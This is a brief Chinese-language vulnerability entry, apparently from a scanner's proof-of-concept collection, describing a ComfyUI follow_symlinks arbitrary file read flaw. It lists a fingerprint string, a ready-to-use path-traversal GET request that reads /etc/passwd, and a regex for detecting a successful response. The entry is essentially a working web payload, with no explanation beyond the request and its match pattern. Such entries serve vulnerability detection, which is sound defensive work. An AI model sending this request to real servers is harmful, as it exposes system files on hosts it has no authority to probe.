# ComfyUIfollow_symlinks文件读取漏洞

ComfyUIfollow ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"ComfyUI"`
- **请求**：`GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$